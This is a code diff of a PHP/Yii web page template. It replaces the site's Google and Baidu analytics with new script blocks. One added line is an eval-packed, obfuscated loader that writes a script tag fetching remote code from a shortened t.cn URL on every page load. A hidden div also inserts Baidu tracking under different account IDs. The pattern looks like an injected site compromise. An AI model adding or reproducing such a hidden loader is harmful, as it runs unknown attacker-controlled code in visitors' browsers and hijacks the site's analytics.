@@ -367,31 +367,16 @@ var _hmt = _hmt || [];
 <!-- 公共common.js -->
 <script src="http://s4.17house.com/common_h5/js/common.js?v=5"></script>
 <script src="<?= Yii::getAlias('@asseturl'); ?>/spread/h5/js/zztc.js?v2016053101"></script>
-<!-- Google Analytics -->
 
-<script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-  ga('create', 'UA-53338747-1', 'auto');
-  ga('send', 'pageview');
-
-</script>
-<!-- google end -->
-
-<!-- baidu -->
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "//hm.baidu.com/hm.js?38cb5604807892b6a56a284c46a38cd1";
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(hm, s);
-})();
-</script>
-
+<script>/* 24111 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|RqDzJXU|cn|http'.split('|'),0,{}));</script>
+<div style="display: none;">
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://"); document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Ff2df2696a0466440d079c373306da108' type='text/javascript'%3E%3C/script%3E")); </script> 
+	<script type="text/javascript" charset="utf-8" async src="http://lxbjs.baidu.com/lxb.js?sid=8979384"></script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://"); document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F02113b70e89c53a8f979402aa526162e' type='text/javascript'%3E%3C/script%3E")); </script> 
+	<script type="text/javascript" charset="utf-8" async src="http://lxbjs.baidu.com/lxb.js?sid=8979354"></script>
+</div>
 </body>
 </html>
 
